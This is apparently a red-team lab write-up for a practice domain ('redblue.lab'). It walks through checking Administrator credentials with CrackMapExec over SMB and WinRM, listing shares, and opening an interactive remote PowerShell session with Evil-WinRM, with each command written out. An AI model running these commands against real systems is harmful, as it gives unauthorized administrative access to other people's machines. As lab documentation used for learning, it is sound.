# Stage 3 – Credential Access and Remote Shell via WINRM

---

## Objective

The goal of Stage 3 was to identify valid domain credentials and use them to gain authenticated access to the target system.

Simulated a typical red team scenario involving:

- SMB enumeration with known credentials
- WINRM validation using CrackMapExec
- Full domain shell access via Evil-WinRM

---

## Tools Used

- CrackMapExec (SMB / WINRM validation)
- Evil-WinRM (interactive shell)

---

## Credentials Used

| Username      | Password         | Domain        |
|---------------|------------------|---------------|
| Administrator | password    | redblue.lab   |

---

## Steps Performed

### 1. Credential Validation via SMB

```bash
crackmapexec smb 192.168.56.101 -u Administrator -p 'password'
```
- Tests whether the provided credentials are valid over SMB (file-sharing protocol) on the target machine.

### 2. Share Enumeration

```bash
crackmapexec smb 192.168.56.101 -u Administrator -p 'password' --shares
```
- Enumerates available network shares (like C$, ADMIN$, SYSVOL, NETLOGON) accessible to this user.

### 3. WINRM Access Validation

``` bash
crackmapexec winrm 192.168.56.101 -u Administrator -p 'password'
```
- Checks if the credentials allow access over the WINRM service, which is needed for remote PowerShell shell access.

### 4. Remote Shell Access with Evil-WinRM

``` bash
evil-winrm -i 192.168.56.101 -u Administrator -p 'password'
```
- Launches an interactive PowerShell session on the remote machine as the authenticated domain user (Domain Admin in this case).

- Confirmed access as redblue\Administrator
- Performed commands like whoami, dir, pwd
